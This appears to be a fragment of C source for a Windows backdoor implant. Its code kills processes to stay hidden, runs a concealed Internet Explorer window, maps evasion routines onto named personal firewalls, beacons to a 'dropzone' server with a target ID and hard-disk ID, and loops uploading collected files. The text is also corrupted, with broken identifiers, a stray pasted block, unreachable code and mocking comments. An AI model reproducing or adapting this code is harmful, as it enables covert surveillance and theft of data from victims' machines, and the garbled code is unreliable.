  return(mRetVal);
}



///
/// Add an item to the list
///

int addItem(char *pFileName, int pFileSize, int pCreationTime)
{
  int mRetVal = 0;
  PFILE_ITEM mCurrentItem = NULL;

  

  ///
  /// No file item attached to the list yet
  ///
  
  if (gFileListHead == NULL)
  {
    if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      strncpy(gFileListHead->mFileName, pFileName, MAX_BUF_SIZE);
      gFileListHead->mFileSize = pFileSize;
      gFileListHead->mCreationTime = pCreationTime;
    } else {
      mRetVal = -1;
      goto END;
    } // if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap()
  } else {
    mCurrentItem = gFileListHead;

    while (mCurrentItem->mNextItem != NULL)
      mCurrentItem = mCurrentItem->mNextItem;

    if ((mCurrentItem->mNextItem = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      mCurrentItem = mCurrentItem->mNextItem;
      strncpy(mCurrentItem->mFileName, pFileName, MAX_BUF_SIZE);
      mCurrentItem->mFileSize = pFileSize;
      mCurrentItem->mCreationTime = pCreationTime;
    } else {
      mRetVal = -2;
      goto END;
    }
  }

END:

  return(mRetVal);
}




///
/// ii) KILL PROCESSES TO STAY HIDDEN
///



///
/// List running processes.
///

int killProcessByName(char *pProcessNamePattern)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  int mCounter = 0;
  int mRetVal = 0;


  if (pProcessNamePattern == NULL)
  {
    mRetVal = 1;
    goto END;
  }

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = 2;
    goto END;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);
  lowerToUpperCase(pProcessNamePattern);



  ///
  /// Retrieve information about the first process and exit if unsuccessful
  ///

  if(!Process32First(hProcessSnap, &pe32))
  {
    CloseHandle(hProcessSnap);
    mRetVal = 3;
    goto END;
  }



  ///
  /// Walk the snapshot of processes.
  ///


  do
  {
    lowerToUpperCase(pe32.szExeFile);

    if (strstr(pe32.szExeFile, pProcessNamePattern) != NULL)
    {
      if (GetCurrentProcessId() != pe32.th32ProcessID)
      {
        if((hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID)) != NULL)
        {
          TerminateProcess(hProcess, 0x00031);
          CloseHandle(hProcess);
        }
      }
    }
  } while(Process32Next(hProcessSnap, &pe32));


END:

  if(hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);

  return(mRetVal);
}



/// 
/// Kill a processes child processes.
///

int killChildProcesses(DWORD pParentPID)
{
  HANDLE hOpenProcHandle;
  HANDLE hProcessSnap;
  PROCESSENTRY32 mPE32ProcessData;
  int mRetVal = 0;

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = 1;
    goto END;
  }

  mPE32ProcessData.dwSize = sizeof(PROCESSENTRY32);



  ///
  /// Retrieve information about the first process,
  /// and exit if not successful.
  ///

  if(!Process32First(hProcessSnap, &mPE32ProcessData) )
  {
    mRetVal = 2;
    goto END;
  }



  ///
  /// Walk through the snapshot of processes, and
  /// display information about each process.
  ///

  do
  {
    if (mPE32ProcessData.th32ParentProcessID == pParentPID) 
    {
      if (!(hOpenProcHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pParentPID)))
        break;
       
      if(TerminateProcess(hOpenProcHandle, 0) == 0) 
      {
        CloseHandle(hOpenProcHandle);
        break;
      }
      CloseHandle(hOpenProcHandle);		
    }
  } while(Process32Next(hProcessSnap, &mPE32ProcessData));

END:

  CloseHandle(hProcessSnap);
  return(mRetVal);
}



///
/// Determine process ID for wanted application.
///

DWORD getProcessID(char *pProcessName, char *pProcessPath, int pProcessPathLength)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int mRetVal = 1;

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if(hProcessSnap == INVALID_HANDLE_VALUE)
    return(-1);

  pe32.dwSize = sizeof(PROCESSENTRY32);


  if (pProcessName != NULL)
    lowerToUpperCase(pProcessName);



  ///
  /// Retrieve information about the first process
  /// and exit if not successful.
  ///

  if(!Proces s32First(hProcessSnap, &pe32) )
  {
    CloseHandle( hProcessSnap );
    return(-2);
  }



  ///
  /// Walk through the snapshot of processes, and
  /// display information about each process.
  ///

  do
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mTemp2, sizeof(mTemp2));

    if (pProcessName != NULL)
      lowerToUpperCase(pe32.szExeFile);

    if (pProcessName != NULL)
      snprintf(mTemp, sizeof(mTemp) -1, "proc : %5d - %s", pe32.th32ProcessID, pe32.szExeFile);
    else
      snprintf(mTemp, sizeof(mTemp) -1, "%8d - %s", pe32.th32ProcessID, pe32.szExeFile);


    if((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
    {
      if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
      {
        // Get the full path to the binary.
        if (GetModuleFileNameEx( hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
        {
          // Print the module name and handle value.
          if (pProcessName != NULL)
            lowerToUpperCase(mBinaryName);

          snprintf(mTemp2, sizeof(mTemp2) -1, "%s", mBinaryName);
        }
      }
      CloseHandle(hProcess);
    }


    if (pProcessName != NULL && (strstr(mTemp, pProcessName) != NULL || strstr(mTemp2, pProcessName) != NULL))
    {      
      mRetVal = pe32.th32ProcessID;
      strncpy(pProcessPath, mTemp2, pProcessPathLength);
      break;
    }
  } while(Process32Next(hProcessSnap, &pe32));

  CloseHandle(hProcessSnap);
  return(mRetVal);
}



///
/// Start IE and/or hide it if necessary.
///

void runIE(char *pIEPath)
{
  char mTemp[MAX_BUF_SIZE + 1];
  int mCounter = 0;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  ZeroMemory(mTemp, sizeof(mTemp));
  snprintf(mTemp, sizeof(mTemp) - 1, "%s", IEXPLORE_PATTERN);
   
  

  ///
  /// If no IE is running, start a new instance.
  ///

  if (processExists(mTemp, NULL) != 0)
  {



    ///
    /// Remember which window was set to the foreground.
    ///

    gCurrentForegroundWindow = NULL; 
    if (!(gCurrentForegroundWindow = GetForegroundWindow()))
      gCurrentForegroundWindow = NULL;

    ZeroMemory(mTemp, sizeof(mTemp));
    snprintf(mTemp, sizeof(mTemp) - 1, "%s -nohome", pIEPath);

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWMINNOACTIVE;


    if (CreateProcess(NULL, mTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
      if (gCurrentForegroundWindow != NULL)
        SetForegroundWindow(gCurrentForegroundWindow);



      ///
      /// Locate the new IE instance and if not yet marked with the 
      /// "_SILENZIO" stamp do so and hide it!
      ///

      gPID = pi.dwProcessId;
      gHidden = 1;

      for (mCounter = 0; mCounter < 1000 && gHidden != 0; mCounter++)
      {
        EnumWindows((WNDENUMPROC) EnumWindowsProcMarker, 0);
        EnumWindows((WNDENUMPROC) EnumWindowsProcHider, 0);
        Sleep(10);
      } // for (mCounter = 0; mCounter < 1000, mCounter++)
    } // CreateProcess(NULL, mTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))


    if (gCurrentForegroundWindow != NULL)
      SetForegroundWindow(gCurrentForegroundWindow);



  ///
  /// If there's already a running instance of it, check if its one of 
  /// ours (marked with _SILENZIO) and hide it, if necessary.
  ///    
    
  } else {
    EnumWindows((WNDENUMPROC) EnumWindowsProcHider, 0);      
  } // if (processExists2(mTemp) != 0)   
}



///
/// Window enumeration callback function. locate the iexplore.exe window and mark it.
///

BOOL CALLBACK EnumWindowsProcMarker(HWND hWnd,LPARAM lParam)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];  
  char winText[MAX_BUF_SIZE];
  DWORD mPID = 0;
  HANDLE hCurrProcHandle;
  HMODULE hMod;
  DWORD cbNeeded;
  int i = 0;


  ZeroMemory(winText, sizeof(winText) - 1);
  if(GetWindowTextLength(hWnd))
  {
    GetWindowText(hWnd, winText, sizeof(winText) - 1);
    GetWindowThreadProcessId(hWnd, &mPID);

    if (mPID == (unsigned long) gPID)
    {
      if ((hCurrProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, mPID)) != NULL)
      {
        if (EnumProcessModules(hCurrProcHandle, &hMod, sizeof(hMod), &cbNeeded))
        {
          ZeroMemory(mTemp2, sizeof(mTemp2));
          GetWindowText(hWnd, mTemp2, sizeof(mTemp2) - 1);

          if (strstr(mTemp2, gBaseDirectory) == NULL)
          {
            ZeroMemory(mTemp, sizeof(mTemp));
            snprintf(mTemp, sizeof(mTemp) - 1, "%s %s", gBaseDirectory, mTemp2);
            SetWindowText(hWnd, mTemp);
            ZeroMemory(mTemp2, sizeof(mTemp2));
            GetWindowText(hWnd, mTemp2, sizeof(mTemp2) - 1); 	     
          }

          ZeroMemory(mTemp, sizeof(mTemp));               
          GetModuleBaseName(hCurrProcHandle, hMod, winText, sizeof(winText));
          lowerToUpperCase(winText);
          strncpy(mTemp, winText, sizeof(mTemp) - 1);
        }
        CloseHandle(hCurrProcHandle);
      }
    }
  }

  return(1);
} 



///
/// Window enumeration callback function. locate the iexplore.exe window and hide it.
///

BOOL CALLBACK EnumWindowsProcHider(HWND hWnd,LPARAM lParam)
{
  char mTemp[MAX_BUF_SIZE + 1]; 
  char winText[MAX_BUF_SIZE];
  DWORD mPID = 0;
  HANDLE hCurrProcHandle;
  HMODULE hMod;
  DWORD cbNeeded;

  ZeroMemory(winText, sizeof(winText) - 1);
  if(GetWindowTextLength(hWnd))
  {
    GetWindowText(hWnd, winText, sizeof(winText) - 1);
    GetWindowThreadProcessId(hWnd, &mPID);

    if (mPID == (unsigned long) gPID)
    {
      if ((hCurrProcHandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, mPID)) != NULL)
      {
        if (EnumProcessModules(hCurrProcHandle, &hMod, sizeof(hMod), &cbNeeded)) 
        {
          ZeroMemory(mTemp, sizeof(mTemp));
          GetWindowText(hWnd, mTemp, sizeof(mTemp) - 1);

          if (strstr(mTemp, gBaseDirectory) != NULL && IsWindowVisible(hWnd))
          {
            ShowWindow(hWnd, SW_HIDE);
            UpdateWindow(hWnd);
            Sleep(50);
            SetWindowLong(hWnd, GWL_EXSTYLE, GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
            Sleep(50);
            ShowWindow(hWnd, SW_HIDE);
            UpdateWindow(hWnd);
            gHidden = 0;
          }
        }
        CloseHandle(hCurrProcHandle);
      }
    }    
  }
  return(1);
}



///
/// Find a process by its name.
///

int processExists(char *pProcessName, int *pPID)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int mRetVal = 1;

  if (pProcessName == NULL)
    return(-1);

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
    return(-2);

  pe32.dwSize = sizeof(PROCESSENTRY32);



  ///
  /// Retrieve information about the first process,
  /// and exit if unsuccessful.

  if(!Process32First(hProcessSnap, &pe32) )
  {
    CloseHandle( hProcessSnap );
    return(-3);
  }



  ///
  /// Now walk the snapshot of processes, and
  /// display information about each process in turn.
  ///

  do
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mTemp2, sizeof(mTemp2));

    if (pProcessName != NULL)
      lowerToUpperCase(pe32.szExeFile);

    if (pProcessName != NULL)
      snprintf(mTemp, sizeof(mTemp) -1, "%s", pe32.szExeFile);
    else
      snprintf(mTemp, sizeof(mTemp) -1, "%s", pe32.szExeFile);



    ///
    /// Determine full path process binary name.
    ///

    if((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
    {
      if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
      {
        if (GetModuleFileNameEx( hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
        {
          if (pProcessName != NULL)
            lowerToUpperCase(mBinaryName);

          snprintf(mTemp2, sizeof(mTemp2) -1, "%s", mBinaryName);
        }
      }
      CloseHandle(hProcess);
    }

    if (pProcessName != NULL && (strstr(mTemp, pProcessName) != NULL || strstr(mTemp2, pProcessName) != NULL))
    { 
      if (pPID != NULL)
        *pPID = pe32.th32ProcessID;

      mRetVal = 0;
      break;
    }
  } while(Process32Next(hProcessSnap, &pe32));


  CloseHandle(hProcessSnap);

  if (mRetVal != 0)
    gHidden = 1;

  return(mRetVal);
}




///
/// Find a process by PID.
///

int PIDExists(int pPid)
{
  HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
  HANDLE hProcess = INVALID_HANDLE_VALUE;
  PROCESSENTRY32 pe32;
  int mCounter = 0;
  int mRetVal = 1;

  if (pPid < 0)
  {
    mRetVal = -1;
    goto END;
  }

  if((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = -2;
    goto END;
  }


  pe32.dwSize = sizeof(PROCESSENTRY32);



  /// 
  /// Retrieve information about the first process and exit if unsuccessful
  ///

  if(!Process32First(hProcessSnap, &pe32))
  {
    mRetVal = -3;
    goto END;
  }



  ///
  /// Now walk the snapshot of processes, and display information about each process in turn
  ///

  do
  {
    mRetVal = 24;
    if ((unsigned int) pPid == pe32.th32ProcessID)
    {
      mRetVal = 0;
      break;
    }
  } while(Process32Next(hProcessSnap, &pe32));

END:

  if (hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);

  if (hProcess != INVALID_HANDLE_VALUE)
    CloseHandle(hProcess);  

  return(mRetVal);
}



///
/// Kill all processes started in our home directory but dont touch our own process [!!!]
///

int killOurProcesses(char *pBaseDirectory)
{
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  char mBinaryName[MAX_BUF_SIZE + 1];
  HMODULE hMods[1024];
  DWORD cbNeeded;
  int mCounter = 0;
  int mRetVal = 0;


  if (pBaseDirectory == NULL || pBaseDirectory[0] == '\0')
  {
    mRetVal = 1;
    goto END;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);
  if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
  {
    mRetVal = 2;
    goto END;
  }


  if(!Process32First(hProcessSnap, &pe32) )
  {
    if (!Process32Next(hProcessSnap, &pe32))
    {
      CloseHandle(hProcessSnap);     // Must clean up the snapshot object! [:D]
      mRetVal = 3;
      goto END;
    }  
  }


  do
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mTemp2, sizeof(mTemp2));

    if(pe32.th32ProcessID != GetCurrentProcessId() && (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)) != NULL)
      if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded) != 0)
        if (GetModuleFileNameEx(hProcess, hMods[0], mBinaryName, sizeof(mBinaryName)))
          if (StrStrI(mBinaryName, pBaseDirectory))
            TerminateProcess(hProcess, 0);

  } while(Process32Next(hProcessSnap, &pe32));


END:

  if (hProcessSnap != INVALID_HANDLE_VALUE)
    CloseHandle(hProcessSnap);
    
  return(mRetVal);
}



///
/// Find a service by name.
///

int serviceExists(char *pServicePattern)
{
  SC_HANDLE mSCM; 
  ENUM_SERVICE_STATUS_PROCESS *mNextService;   
  DWORD mBufferSize = 0;
  DWORD mCounter = 0;
  DWORD mResume = 0;
  DWORD i = 0;  
  char *mBuffer, *mServiceName;
  char mTemp[MAX_BUF_SIZE + 1];
  char mServicePattern[MAX_BUF_SIZE + 1];
  int mRetVal = 1;

  mSCM = OpenSCManager(NULL, NULL, GENERIC_READ);
  mBuffer = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mBufferSize);

  ZeroMemory(mBuffer, mBufferSize);
  EnumServicesStatusEx(mSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_ACTIVE, (unsigned char *) mBuffer, mBufferSize, &mBufferSize, &mCounter, &mResume, NULL);


  ZeroMemory(mServicePattern, sizeof(mServicePattern));
  strncpy(mServicePattern, pServicePattern, sizeof(mServicePattern) - 1);
  lowerToUpperCase(mServicePattern);

  for(i = 0; i < mCounter; i++)
  {
    mNextService = ((ENUM_SERVICE_STATUS_PROCESS *) mBuffer) + i;
    mServiceName = _strlwr(strdup(mNextService->lpServiceName));
  
    ZeroMemory(mTemp, sizeof(mTemp));
    strncpy(mTemp, mServiceName, sizeof(mTemp) - 1);
    lowerToUpperCase(mTemp);  
 


    ///
    /// Check if service exists.
    ///

    if (strstr(mTemp, mServicePattern) != NULL)
    {
      mRetVal = 0;
      goto END;
    }  
  }
  
END:

  CloseServiceHandle(mSCM);  

  if (mBuffer != NULL)
  {
    HeapFree(GetProcessHeap(), 0, mBuffer);
    mBuffer = NULL;
  }
  
  return(mRetVal);
}




///
/// iii) ACTUALLY SWERVING MAIN FIREWALL AND THE MAIN UL PREP
///

wcex.lpszMenuName = WINDOWNAME;
  wcex.lpszClassName = CLASSNAME;
  wcex.hIconSm = NULL;

  RegisterClassEx(&wcex);


  hCurrentForegroundWindow = GetForegroundWindow();
  hInst = hInstance; // Store instance handle in our global variable
  if (!(hWnd = CreateWindow(CLASSNAME, WINDOWNAME, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL)))
    return(FALSE);

  ShowWindow(hWnd, SW_HIDE);
  UpdateWindow(hWnd);

  if (hCurrentForegroundWindow != NULL)
    SetForegroundWindow(hCurrentForegroundWindow);

  if ((mThreadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) mainLoop, 0, 0, &mThreadID)) == NULL)
    return(0);



   ///
   /// Main message loop:
   ///

  while(1)
  {
    if (GetQueueStatus(QS_ALLINPUT) != 0)
    {
      if (GetMessage(& msg, NULL, 0, 0)) 
      {
        TranslateMessage(& msg);
        DispatchMessage(& msg);
      }
    }

    if (WaitForSingleObject(mThreadHandle, 500) != WAIT_TIMEOUT)
    {
      TerminateThread(mThreadHandle, 0);
      CloseHandle(mThreadHandle);
      break;
    }
    Sleep(100);
  }
  return(msg.wParam);
}


DWORD mainLoop(LPVOID pData)
{
  int mConnectivity = 0;
  char mProxyName[MAX_BUF_SIZE + 1];
  char mProxyPort[128];
  char mGetBuffer[MAX_BUF_SIZE + 1];
  char mProxyConnection[MAX_BUF_SIZE + 1];
  char mTemp[MAX_BUF_SIZE + 1];
  char mTemp2[MAX_BUF_SIZE + 1];
  DWORD mThreadIDDoUploads = 0;
  DWORD mThreadIDHTTPInstruction = 0;
  HANDLE mUploadThreadHandle = INVALID_HANDLE_VALUE;
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  gMyPFWCircumventionStatus fPFWCircumventionStatus[DEFINITION_COUNTER];
  gMyPFWCircumventionUpload fPFWCircumventionUpload[DEFINITION_COUNTER];
  int mCircumventionType = 0;
  DWORD mExitCode = 0;
  int mStatusValue = 0;
  char mB64EncodedFileName[MAX_BUF_SIZE + 1];



  ///
  /// Do nothing without a correct configuration
  ///

  if (strstr(gLIID, CONFIG_STRING))
    return(2);

  if (strstr(gBaseDirectory, CONFIG_STRING))
    return(3);

  if (strstr(gUploadServer, CONFIG_STRING))
    return(4);

  if (strstr(gMaxHDResource, CONFIG_STRING) || atoi(gMaxHDResource) < 0)
    return(5);

  if (strstr(gHDDStatus, CONFIG_STRING))
    return(6);



  ///
  /// If binary called without "exe" extension, attach it
  ///

  ZeroMemory(gProgrammName, sizeof(gProgrammName));

  if (strrchr(__argv[0], '\\') != NULL)
    strncpy(gProgrammName, strrchr(__argv[0], '\\') + 1, sizeof(gProgrammName) - 1);
  else
    strncpy(gProgrammName, __argv[0], sizeof(gProgrammName) - 1);

  if (strstr(gProgrammName, ".exe") == NULL && strstr(gProgrammName, ".EXE") == NULL)
    strcat(gProgrammName, ".exe");



  ///
  /// Initialisation stuff
  ///

  ZeroMemory(gHomeDirectory, sizeof(gHomeDirectory));
  if (strrchr(_pgmptr, '\\') != NULL)
    strncpy(gHomeDirectory, _pgmptr, strrchr(_pgmptr, '\\') - _pgmptr);

  ZeroMemory(mProxyPort, sizeof(mProxyPort));

  if (strlen(gHomeDirectory))
    SetCurrentDirectory(gHomeDirectory);



  ///
  /// upload a file
  ///

  if (__argc == 3 && !strcmp(__argv[1], "hu"))
  {
    ZeroMemory(mTemp, sizeof(mTemp));	



    ///
    /// determine proxy configuration
	  ///

	ZeroMemory(mProxyConnection, sizeof(mProxyConnection));
	if (getProxySettings(mProxyName, mProxyPort) == 1)
	  snprintf(mProxyConnection, MAX_BUF_SIZE, "%s:%s", mProxyName, mProxyPort);



    ///
    /// determine personal firewall
    ///

    fPFWCircumventionUpload[DEFINITION_NOPFW] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_OUTPOST] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_MCAFEE] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_MCAFEE_2] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_ZONEALARM] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_BITDEFENDER] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_FSECURE] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_KERIO] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_AVG] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_WEBROOT] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_ASC] = &uploadData_DirectMain;
    fPFWCircumventionUpload[DEFINITION_MWB] = &uploadData_DirectMain;
    fPWFCircumventionUpload[DEFINITION_WIN] = &uploadData_DirectMain;

    strncpy(mB64EncodedFileName, __argv[2], sizeof(mB64EncodedFileName) - 1);



    ///
    /// determine personal firewall and circumvent it, if necessary [!!!] ???HOW WUT??? [!!!]
	  ///

    mCircumventionType = getPFWInstallation();
    fPFWCircumventionUpload[mCircumventionType](mB64EncodedFileName, mProxyConnection);
    exit(0);



///
/// activate windows scripting host
///

    activateWindowsScriptingHost();



    /// 
    /// Main and endless loop. Do all these steps over and over again :
    ///
    /// 1. Determine local stati. 
    /// 2. Fetching instructions/stati from dropzone and passing local stati to dropzone.
    /// 3. Upload file structure map, any files and other lookyloos - call 7z'd data.
    ///
    ///



    while (1)
    {        
      ///
      /// If silent mode was deactivated exchange determine relevant local status
      /// information and exchange status with the dropzone server.
      ///  

      mCircumventionType = getPFWInstallation();
      mConnectivity = 0;

      while (atoi(gSilentMode) == 0 && mConnectivity == 0)
      {



        ///
        /// Do HD resource checks.
        ///

  	    if (atoi(gMaxHDResource) > 0)
	      HDDManager();



        ///
        /// TASK 1 :
        ///
        /// Get local status information. Check which components
        /// were installed on this target system (BT).
        ///

        mStatusValue = localStatusChecks();



        ///
        /// Build HTTP request to get instructions from the dropzone
        /// server.
        ///

        ZeroMemory(mGetBuffer, sizeof(mGetBuffer));
        ZeroMemory(mTemp, sizeof(mTemp));

        snprintf(mTemp, sizeof(mTemp) - 1, "%s\\%s", gHomeDirectory, FIRST_CONNECT_FILE);
        if (! PathFileExists(mTemp))
        {
          ZeroMemory(mTemp2, sizeof(mTemp2));
          getHardDiskID(mTemp2, sizeof(mTemp2));

          snprintf(mGetBuffer, sizeof(mGetBuffer) - 1, "http://%s%s?liid=%s&version=%s&status=%d&first=%s", gUploadServer, HTTP_INPUT_SCRIPT, gLIID, gBackdoorVersion, mStatusValue, mTemp2); /// [!!! so many q's !!!]
        } else
          snprintf(mGetBuffer, sizeof(mGetBuffer) - 1, "http://%s%s?liid=%s&version=%s&status=%d", gUploadServer, HTTP_INPUT_SCRIPT, gLIID, gBackdoorVersion, mStatusValue); /// [!!! more q's again !!!]

        ZeroMemory(mProxyConnection, sizeof(mProxyConnection));
        if (getProxySettings(mProxyName, mProxyPort) == 1)
          snprintf(mProxyConnection, MAX_BUF_SIZE, "%s:%s", mProxyName, mProxyPort);



        ///
        /// TASK 2 :
        ///
        /// Bypass Desktop-Firewall and send HTTP request to the dropzone.
        /// If the dropzone server was responding, process the
        /// passed instructions. Otherwise wait some seconds and retry again.
        ///

        if (fPFWCircumventionStatus[mCircumventionType](mGetBuffer, mProxyConnection, REQUEST_TYPE_SYSTEMUP) != 0)
          Sleep(NOCONNECTIVITYSLEEP);
        else {
          remoteStatusChecks(mGetBuffer); 
          mConnectivity = 1;
        } // if (fPFWCircumventionStatus...
      } // while (mConnectivity == 0)



      ///
      /// We have to set a flag to know we've already connected to the dropzone once.
      /// Therefore we create the FIRST_CONNECT_FILE.
      ///

      ZeroMemory(mTemp, sizeof(mTemp));
      snprintf(mTemp, sizeof(mTemp) - 1, "%s\\%s", gHomeDirectory, FIRST_CONNECT_FILE);
      if (! PathFileExists(mTemp))
      {
        if ((mFileHandle = CreateFile(mTemp, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
        {
          CloseHandle(mFileHandle);
        } // if ((mFileHandle = CreateFile(...
      } // if (! PathFileExists(mTemp))



      ///
      /// TASK 3 : Start a new upload thread and close/terminate the old one.
      ///

      if (gUploadStatus != UPLOAD_THREAD_STOPPED && GetExitCodeThread(mUploadThreadHandle, &mExitCode))
      {
        if (mExitCode != STILL_ACTIVE)
        {
          CloseHandle(mUploadThreadHandle);     
          gUploadStatus = UPLOAD_THREAD_STOPPED;
        }
      }

      if (gUploadStatus == UPLOAD_THREAD_STOPPED) 
        if ((mUploadThreadHandle = CreateThread(NULL, 0, doHTTPUploadsThread, NULL, 0, &mThreadIDDoUploads)) != INVALID_HANDLE_VALUE)
          gUploadStatus = UPLOAD_THREAD_STARTED;



      Sleep(INSTRUCTIONSLEEPER);
    } // while (1) 
  }

  return(0);
}                
             


///
/// filestructure andf file data upload thread. It will upload 
/// all files containing the file extension ".fsu"
///

DWORD WINAPI doHTTPUploadsThread(LPVOID pData)
{
  char mTemp[MAX_BUF_SIZE + 1];
  char mUploadFileFullPath[MAX_BUF_SIZE + 1];
  char mFilesUploadPattern[MAX_BUF_SIZE + 1];
  char mUploadDirFullPath[MAX_BUF_SIZE + 1];
  char mSkypeBinaryName[MAX_BUF_SIZE + 1];
  char *mFileEntries[MAX_FILE_ENTRIES];
  char mRealFileEntries[MAX_FILE_ENTRIES][MAX_BUF_SIZE + 1];
  int mCounter = 0;
  char mCmdLine[MAX_BUF_SIZE + 1];
  int mRetCode = 0;
  DWORD mRetVal = 0;

  int mCircumventionType = 0;
  int i = 0;
  int mTotalFiles = 0;

  DWORD mWritten = 0;
  STARTUPINFO si;
  PROCESS_INFORMATION  pi;



  ///
  /// Assign & initialize buffers
  ///

  for (mCounter = 0; mCounter < MAX_FILE_ENTRIES; mCounter++)
  {
    ZeroMemory(mRealFileEntries[mCounter], MAX_BUF_SIZE + 1);
    mFileEntries[mCounter] = mRealFileEntries[mCounter];
  }



  ///
  /// Check all possible backdoor directories for uploadable files
  ///

  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");

      if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
        strcat(gBaseDirectory, "\\");

      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, BD_DATA_DIR);


      if (mUploadDirFullPath[strlen(mUploadDirFullPath) - 1] != '\\')
        strcat(mUploadDirFullPath, "\\");

      if (PathFileExists(mUploadDirFullPath))
      { 



        ///
        /// list all files in other interesting directories and select files 
        /// with matching pattern ("*.fsu" at this time)
        ///

        ZeroMemory(mFilesUploadPattern, sizeof(mFilesUploadPattern));
        snprintf(mFilesUploadPattern, sizeof(mFilesUploadPattern) - 1, "%s%s", mUploadDirFullPath, UPLOAD_FILE_PATTERN);

        determineFilesToUpload(mFilesUploadPattern, mFileEntries, &mTotalFiles);

        if (mTotalFiles > 0)
        {
          qsort((void *) mFileEntries, (size_t) mTotalFiles, sizeof(char *), compare);



          ///
